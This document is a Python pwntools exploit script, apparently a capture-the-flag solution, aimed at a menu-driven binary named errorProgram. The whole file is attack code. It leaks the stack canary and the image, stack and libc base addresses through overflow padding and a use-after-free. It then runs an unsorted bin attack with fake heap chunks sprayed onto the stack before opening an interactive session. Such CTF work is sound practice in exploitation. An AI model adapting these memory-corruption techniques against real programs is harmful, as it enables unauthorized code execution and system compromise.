from pwn import *

s=process("./errorProgram")
#s=remote("error-program.ctf.defenit.kr", 7777)


def add(idx, size):
	s.sendlineafter("YOUR CHOICE? : ", str(1))
	s.sendlineafter("INDEX? : ", str(idx))
	s.sendlineafter("SIZE? : ", str(size))

def free(idx):
	s.sendlineafter("YOUR CHOICE? : ", str(2))
	s.sendlineafter("INDEX? : ", str(idx))

def view(idx):
	s.sendlineafter("YOUR CHOICE? : ", str(4))
	s.sendlineafter("INDEX? : ", str(idx))

def edit(idx, data):
	s.sendlineafter("YOUR CHOICE? : ", str(3))
	s.sendlineafter("INDEX? : ", str(idx))
	s.sendafter("DATA : ", data)

# leak canary
s.sendlineafter("YOUR CHOICE? : ", str(2))
s.sendafter("Input your payload : ", "a"*0xe8 + "x")
s.recvuntil("x")
canary  = u64("\x00"+s.recv(7))
log.info("canry = " + hex(canary))


# leak image base
s.sendlineafter("YOUR CHOICE? : ", str(2))
s.sendafter("Input your payload : ", "a"*0xe8 + "z"*8)
s.recvuntil("z"*8)
base  = u64(s.recv(6)+"\x00\x00")-0x1338
log.info("Base = " + hex(base))

# leak stack base
table = base+0x202060
log.info("Table = " + hex(table))
s.sendlineafter("YOUR CHOICE? : ", str(2))
s.sendafter("Input your payload : ", "a"*0xf8 + "z"*8)
s.recvuntil("z"*8)
stack  = u64(s.recv(6)+"\x00\x00")-0x1fe10
log.info("stack = " + hex(stack))


# Leak libc
s.sendlineafter("YOUR CHOICE? : ", str(3)) # UAF menu
add(0, 0x800)
add(1, 0x800)
free(0)
view(0)
s.recvuntil("DATA : ")
unbin  = u64(s.recv(6)+"\x00\x00")
lBase  = unbin-0x3ebca0
log.info("libc base = " + hex(lBase))

# Unsorted bin attack
edit(0, p64(0) + p64(table-0x8))
add(2, 0x800) # unsorted bin addr in table[1]

# Setup stack with fake structure
fake = p64(0) + p64(0x911) + p64(unbin)*2
fakeaddr = stack+0x1fe80

# Overwrite unsorted bin with fake stack addr
s.sendlineafter("YOUR CHOICE? : ", str(3))
s.sendlineafter("INDEX? : ", "1" + "\x00"*7 + p64(0) + fake)
s.sendafter("DATA : ", p64(0)*2 + p64(fakeaddr)*2)

s.sendlineafter("YOUR CHOICE? : ", str(5)) # return
# Spray stack with fake struts
s.sendlineafter("YOUR CHOICE? : ", str(1))
s.sendafter("Input your payload : ", fake*8)

s.sendlineafter("YOUR CHOICE? : ", str(3)) # UAF menu

gdb.attach(s,'b*0x000555555554F2C\nb*0x00555555554F68\nb malloc_printerr')
s.sendlineafter("YOUR CHOICE? : ", str(1))
s.sendlineafter("INDEX? : ", str(3))
s.sendlineafter("SIZE? : ", str(2304) + p32(0) + p64(0) + fake)

s.interactive()
